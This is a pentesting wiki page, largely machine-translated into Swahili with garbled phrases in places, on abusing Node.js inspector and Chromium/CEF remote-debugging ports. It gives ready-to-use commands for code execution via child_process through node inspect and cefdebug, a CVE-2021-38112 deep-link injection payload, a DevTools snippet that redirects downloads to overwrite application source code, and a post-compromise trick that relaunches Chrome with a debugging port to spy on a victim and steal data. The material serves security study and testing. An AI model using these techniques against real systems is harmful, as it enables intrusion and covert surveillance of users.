# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wakati umeanzishwa na swichi `--inspect`, mchakato wa Node.js unasikiliza mteja wa ufuatiliaji. Kwa **kawaida**, itasikiliza kwenye mwenyeji na bandari **`127.0.0.1:9229`**. Kila mchakato pia umepewa **UUID** **maalum**.

Wateja wa mfuatiliaji lazima wajue na kubainisha anwani ya mwenyeji, bandari, na UUID ili kuungana. URL kamili itakuwa na muonekano kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Kwa sababu **mfuatiliaji una ufikiaji kamili wa mazingira ya utekelezaji wa Node.js**, mhusika mbaya anayeweza kuungana na bandari hii anaweza kuwa na uwezo wa kutekeleza msimbo wowote kwa niaba ya mchakato wa Node.js (**kuinua ruhusa kwa uwezekano**).

Kuna njia kadhaa za kuanzisha mfuatiliaji:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wakati unapoanza mchakato ulioangaziwa kitu kama hiki kitaonekana:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Mchakato unaotegemea **CEF** (**Chromium Embedded Framework**) kama unahitaji kutumia param: `--remote-debugging-port=9222` kufungua **debugger** (ulinzi wa SSRF unabaki kuwa sawa). Hata hivyo, badala ya kutoa kikao cha **NodeJS** **debug**, watCommunication na kivinjari kwa kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), hii ni interface ya kudhibiti kivinjari, lakini hakuna RCE ya moja kwa moja.

Unapoanzisha kivinjari kilichosahihishwa kitu kama hiki kitaonekana:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguliwa kwenye kivinjari cha wavuti zinaweza kufanya maombi ya WebSocket na HTTP chini ya mfano wa usalama wa kivinjari. **Muunganisho wa awali wa HTTP** unahitajika ili **kupata kitambulisho cha kipekee cha kikao cha debugger**. **Sera ya same-origin** **inazuia** tovuti kuwa na uwezo wa kufanya **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**shambulio la DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js inathibitisha kwamba **'Host' headers** za muunganisho zinapaswa kuonyesha **anwani ya IP** au **`localhost`** au **`localhost6`** kwa usahihi.

> [!NOTE]
> Hizi **mbinu za usalama zinazuia kutumia inspector** kuendesha msimbo kwa **kupeleka tu ombi la HTTP** (ambalo linaweza kufanywa kwa kutumia udhaifu wa SSRF).

### Starting inspector in running processes

Unaweza kutuma **ishara SIGUSR1** kwa mchakato wa nodejs unaoendelea ili kuifanya **ianza inspector** kwenye bandari ya kawaida. Hata hivyo, kumbuka kwamba unahitaji kuwa na ruhusa za kutosha, hivyo hii inaweza kukupa **ufikiaji wa haki za habari ndani ya mchakato** lakini si kupanda moja kwa moja kwa haki.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Hii ni muhimu katika kontena kwa sababu **kuzima mchakato na kuanzisha mpya** kwa kutumia `--inspect` **sio chaguo** kwa sababu **konteina** itauawa pamoja na mchakato.

### Unganisha na mpelelezi/debugger

Ili kuungana na **browsa inayotegemea Chromium**, URLs `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **mwenyeji wa lengo na bandari** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Utekelezaji wa Msimbo wa K remote (RCE):

![](<../../images/image (674).png>)

Kwa kutumia **mistari ya amri** unaweza kuungana na mpelelezi/debugger kwa:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Chombo [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), kinaruhusu **kupata wakaguzi** wanaotembea kwa ndani na **kuingiza msimbo** ndani yao.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa umeunganishwa na kivinjari kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).

## RCE katika NodeJS Debugger/Inspector

> [!NOTE]
> Ikiwa umekuja hapa kutafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Njia kadhaa za kawaida za kupata **RCE** unapoweza **kuunganisha** na **inspector** ya Node ni kutumia kitu kama (inaonekana kwamba hii **haitafanya kazi katika muunganisho na Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Katika sehemu hii nitataja tu mambo ya kuvutia ambayo nimeona watu wakitumia kutekeleza matumizi ya protokali hii.

### Parameter Injection via Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kwamba programu inayotegemea CEF **iliandikisha UR**I maalum katika mfumo (workspaces://index.html) ambayo ilipokea URI kamili na kisha **ikaanzisha programu inayotegemea CEF** na usanidi ambao ulikuwa unajengwa kwa sehemu kutoka kwa URI hiyo.

Iligundulika kwamba vigezo vya URI vilikuwa vimefichuliwa URL na kutumika kuanzisha programu ya msingi ya CEF, ikiruhusu mtumiaji **kuingiza** bendera **`--gpu-launcher`** katika **mstari wa amri** na kutekeleza mambo yasiyo na mipaka.

Hivyo, payload kama:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.

### Badilisha Faili

Badilisha folda ambapo **faili zilizopakuliwa zitahifadhiwa** na upakue faili ili **kubadilisha** **kanuni ya chanzo** inayotumiwa mara kwa mara ya programu na **kanuni yako mbaya**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE na exfiltration

Kulingana na chapisho hili: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) inawezekana kupata RCE na kuhamasisha kurasa za ndani kutoka theriver.

### Baada ya Utekelezaji

Katika mazingira halisi na **baada ya kuathiri** PC ya mtumiaji anaye tumia kivinjari kinachotegemea Chrome/Chromium unaweza kuzindua mchakato wa Chrome na **kuanzisha ufuatiliaji wa mchakato na kuhamasisha bandari ya ufuatiliaji** ili uweze kuifikia. Kwa njia hii utaweza **kuangalia kila kitu ambacho mwathirika anafanya na Chrome na kuiba taarifa nyeti**.

Njia ya siri ni **kuondoa kila mchakato wa Chrome** na kisha kuita kitu kama
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
